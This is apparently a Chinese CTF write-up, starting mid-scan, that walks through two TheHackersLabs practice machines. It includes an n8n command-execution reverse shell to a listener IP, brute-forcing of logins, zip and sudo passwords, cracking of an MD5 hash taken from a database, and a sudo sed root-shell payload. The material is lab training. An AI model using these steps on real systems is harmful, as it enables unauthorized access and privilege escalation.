SF:INT\x20=\x20'rest';\n\t\t</script>\n\t\t<script\x20src=\"/rest/sentry\.
SF:js\"></script>\n\t\t<script>!function\(t,e\){var\x20o,n,")%r(HTTPOption
SF:s,183,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20
SF:default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-
SF:Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nVary:
SF:\x20Accept-Encoding\r\nDate:\x20Mon,\x2010\x20Nov\x202025\x2012:45:37\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r
SF:(RTSPRequest,183,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-
SF:Policy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:43\r\nVary:\x20Accept-Encoding\r\nDate:\x20Mon,\x2010\x20Nov\x202025\x2
SF:012:45:37\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<ht
SF:ml\x20lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</
SF:title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</
SF:html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 773.81 seconds
```

看上去5678端口是个n8n面板web服务

因为是个登录服务，不太想先碰，看看另一个web服务

乍一看，是个apache的安装成功页面

查看源代码，拿到了关键信息

<img src="/assets/img/thehackerslabs-notes/image-20251110205622293.png" alt="image-20251110205622293" style="zoom:50%;" />

翻译了下，这里就给出了登录邮箱，然后密码的话，说是有至少8位密码，然后有大写有数字，老外这脑回路真抽象啊，我就这样把rockyou过滤了一下

```bash
cat /snap/seclists/rockyou.txt | grep -P '(?=.*\d)(?=.*[A-Z])(?=.*[a-z])' > pass.txt
```

大致意思是说把匹配只有数字和英文字母的密码给提取出来了

然后我用burp爆破，发现爆破出来了一个合适的密码，omg，这神奇的脑回路

<img src="/assets/img/thehackerslabs-notes/image-20251110211239085.png" alt="image-20251110211239085" style="zoom: 50%;" />

对了，上面补充一个信息，就是我对apache这个web进行路径扫描，也扫描到了login.php呢，然后上面密码爆破的poc就是爆破的8765这个端口的login.php

<img src="/assets/img/thehackerslabs-notes/image-20251110211546750.png" alt="image-20251110211546750" style="zoom:50%;" />

666,这题好抽象

### get shell

直接创建个工作流，在Core下面直接选择执行命令行

<img src="/assets/img/thehackerslabs-notes/image-20251110212334723.png" alt="image-20251110212334723" style="zoom:50%;" />

```bash
busybox nc 10.161.149.243 4444 -e bash 
```

<img src="/assets/img/thehackerslabs-notes/image-20251110221542116.png" alt="image-20251110221542116" style="zoom:50%;" />

然后我的kali端监听到了，接下来就是稳定shell阶段

```bash
/usr/bin/script -qc /bin/bash /dev/null
^z
stty raw -echo;fg
reset
xterm
```

真的很纳闷呢，明明写了可以无密码执行vi，结果当前用户必须写密码执行

```bash
thl@nodeception:~$ ls -la
total 52
drwxr-x--- 8 thl  thl  4096 nov 10 14:05 .
drwxr-xr-x 3 root root 4096 jul  6 10:20 ..
lrwxrwxrwx 1 root root    9 jul  7 12:40 .bash_history -> /dev/null
-rw-r--r-- 1 thl  thl   220 mar 31  2024 .bash_logout
-rw-r--r-- 1 thl  thl  3968 jul 18 11:12 .bashrc
drwx------ 4 thl  thl  4096 jul 18 11:13 .cache
drwxrwxr-x 3 thl  thl  4096 jul  6 13:29 .local
drwxrwxr-x 6 thl  thl  4096 nov 10 13:58 .n8n
drwxrwxr-x 5 thl  thl  4096 jul 18 11:13 .npm
drwxrwxr-x 8 thl  thl  4096 jul 18 11:12 .nvm
-rw-r--r-- 1 thl  thl   807 mar 31  2024 .profile
drwx------ 2 thl  thl  4096 jul  6 10:20 .ssh
-rw-r--r-- 1 thl  thl     0 jul  6 10:22 .sudo_as_admin_successful
-rw-r--r-- 1 root thl    27 jul  7 12:38 user.txt
-rw------- 1 thl  thl  1570 nov 10 14:05 .viminfo
thl@nodeception:~$ cat user.txt
THL_wdYkVpXlqNaEUhRJ??????
thl@nodeception:~$ sudo -l
Matching Defaults entries for thl on nodeception:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User thl may run the following commands on nodeception:
    (ALL) NOPASSWD: /usr/bin/vi
    (ALL : ALL) ALL
```

这绝对是个bug，最后只能爆破下密码了

<img src="/assets/img/thehackerslabs-notes/image-20251110221853057.png" alt="image-20251110221853057" style="zoom:50%;" />

```bash
thl@nodeception:~$ sudo su
[sudo] password for thl: 
root@nodeception:/home/thl# id
uid=0(root) gid=0(root) groups=0(root)
root@nodeception:/home/thl# cd && cat root.txt
THL_QzXeoMuYRcJtWHabn??????
```
## Sedition
> **提示:** 靶机跳转传送门
[Sedition](https://labs.thehackerslabs.com/machines/117)

<img src="/assets/img/thehackerslabs-notes/Sedition.png" alt="Sedition" style="zoom:50%;" />

### 信息搜集

```bash
❯ nmap -p- --min-rate 5000 10.161.161.139
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 23:10 CST
Nmap scan report for 10.161.161.139
Host is up (0.00064s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
65535/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds
❯ nmap -sCV -p 65535 10.161.161.139
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 23:11 CST
Nmap scan report for 10.161.161.139
Host is up (0.00059s latency).

PORT      STATE SERVICE VERSION
65535/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey:
|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.63 seconds
```

一开始爆破，发现就两个smb服务，这样的话，我可远程连不上，就全部爆破了下，发现65535开放，是我要的ssh服务

在smb服务中呢，我匿名拿到了一个压缩包

```bash
❯ smbclient -L //10.161.161.139 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk
        IPC$            IPC       IPC Service (Samba Server)
        nobody          Disk      Home Directories
SMB1 disabled -- no workgroup available
❯ smbclient //10.161.161.139/backup -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul  7 01:02:53 2025
  ..                                  D        0  Mon Jul  7 02:15:13 2025
  secretito.zip                       N      216  Mon Jul  7 01:02:31 2025

                19480400 blocks of size 1024. 16245492 blocks available
smb: \> get secretito.zip
getting file \secretito.zip of size 216 as secretito.zip (19.2 KiloBytes/sec) (average 19.2 KiloBytes/sec)
smb: \> q
```

但是呢，我发现压缩包是加密过的，那就用john爆破处理了

```bash
❯ bkcrack -L secretito.zip
bkcrack 1.8.0 - 2025-08-18
Archive: secretito.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 ZipCrypto  Store       f2e5967a           22           34 password
❯ zip2john secretito.zip > ziphash
ver 1.0 efh 5455 efh 7875 secretito.zip/password PKZIP Encr: 2b chk, TS_chk, cmplen=34, decmplen=22, crc=F2E5967A ts=969D cs=969d type=0
Note: It is normal for some outputs to be very large
❯ john ziphash --wordlist=/snap/seclists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Cracked 1 password hash (is in /home/yolo/Desktop/tools/john/run/john.pot), use "--show"
No password hashes left to crack (see FAQ)
❯ john ziphash --show
secretito.zip/password:sebastian:password:secretito.zip::secretito.zip

1 password hash cracked, 0 left
```

这里是因为我之前爆破过，已经结果出来了，拿到压缩包密码`sebastian`

解压后拿到密码`elbunkermolagollon123`

下面操作中由于宿舍网断了，连热点的话，靶机IP会变，凑活看吧

### get shell

```bash
❯ rpcclient -N -U ""  192.168.233.191
rpcclient $> enumdomusers
user:[cowboy] rid:[0x3e8]
rpcclient $>
```

会发现，靶机有用户cowboy，结合上面的那个密码，完全可以ssh连接上去

```bash
cowboy@Sedition:~$ ls -la
total 116
drwx------ 2 cowboy cowboy  4096 nov 10 16:30 .
drwxr-xr-x 4 root   root    4096 jul  6 18:56 ..
-rw------- 1 cowboy cowboy   350 nov 10 16:40 .bash_history
-rw-r--r-- 1 cowboy cowboy   220 jul  6 18:56 .bash_logout
-rw-r--r-- 1 cowboy cowboy  3526 jul  6 18:56 .bashrc
-rw------- 1 cowboy cowboy    20 nov 10 16:19 .lesshst
-rw------- 1 cowboy cowboy    98 nov 10 16:30 .mysql_history
-rw-r--r-- 1 cowboy cowboy   807 jul  6 18:56 .profile
cowboy@Sedition:~$ ls ../
cowboy  debian
cowboy@Sedition:~$ ls ../debian
ls: no se puede abrir el directorio '../debian': Permiso denegado
```

显然要水平渗透，拿到debian用户的shell，先看看.bash_history

```bash
cowboy@Sedition:~$ cat .bash_history
history
exit
mariadb
mariadb -u cowboy -pelbunkermolagollon123
su debian
```

这里有个数据库连接操作，进去后，可以拿到debian用户密码的md5哈希值

```bash
cowboy@Sedition:~$ mariadb -u cowboy -pelbunkermolagollon123
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 31
Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| bunker             |
| information_schema |
+--------------------+
2 rows in set (0,112 sec)

MariaDB [(none)]> use bunker;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [bunker]> SHOW TABLES;
+------------------+
| Tables_in_bunker |
+------------------+
| users            |
+------------------+
1 row in set (0,000 sec)

MariaDB [bunker]> SELECT * FROM users;
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
+--------+----------------------------------+
1 row in set (0,022 sec)

MariaDB [bunker]> ^DBye
```

拿到密码

<img src="/assets/img/thehackerslabs-notes/image-20251110234636466.png" alt="image-20251110234636466" style="zoom:50%;" />

然后get user flag

```bash
cowboy@Sedition:~$ su debian
Contraseña: 
debian@Sedition:/home/cowboy$ ls -la
ls: no se puede abrir el directorio '.': Permiso denegado
debian@Sedition:/home/cowboy$ cd
debian@Sedition:~$ ls -la
total 36
drwx-----x 4 debian debian  4096 jul  6 20:15 .
drwxr-xr-x 4 root   root    4096 jul  6 18:56 ..
drwxr-xr-x 2 nobody nogroup 4096 jul  6 19:02 backup
-rw------- 1 debian debian   755 nov 10 16:40 .bash_history
-rw-r--r-- 1 debian debian   220 jul  6 11:07 .bash_logout
-rw-r--r-- 1 debian debian  3526 jul  6 11:07 .bashrc
-rw-r--r-- 1 debian debian    21 jul  6 20:15 flag.txt
drwxr-xr-x 3 debian debian  4096 jul  6 18:52 .local
-rw-r--r-- 1 debian debian   807 jul  6 11:07 .profile
debian@Sedition:~$ cat flag.txt
pinguinitoping??????
```

### to root

```bash
debian@Sedition:~$ sudo -l
Matching Defaults entries for debian on sedition:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on sedition:
    (ALL) NOPASSWD: /usr/bin/sed
```

发现可以用sed来进行sudo无密码提权

```bash
debian@Sedition:~$ sudo sed -n '1e exec sh 1>&0' /etc/hosts
# id
uid=0(root) gid=0(root) grupos=0(root)
# cd
# cat root.txt
laflagdelbunkerderootmola??????
```

> payload解析

`sudo sed -n '1e exec sh 1>&0'`

- `sed -n` 安静模式，不自动打印模式空间的内容
- 正常情况下sed会处理输入并输出对应内容，但是-n可以让它只执行命令不输出

- `'1e exec sh 1>&0'`
- - 1：匹配第一行
  - e：sed的执行命令，执行后面的shell命令
  - exec sh：用sh进程替换当前sed进程
  - 1>&0：将标准输出重定向到标准输入，确保shell的I/O能正常工作

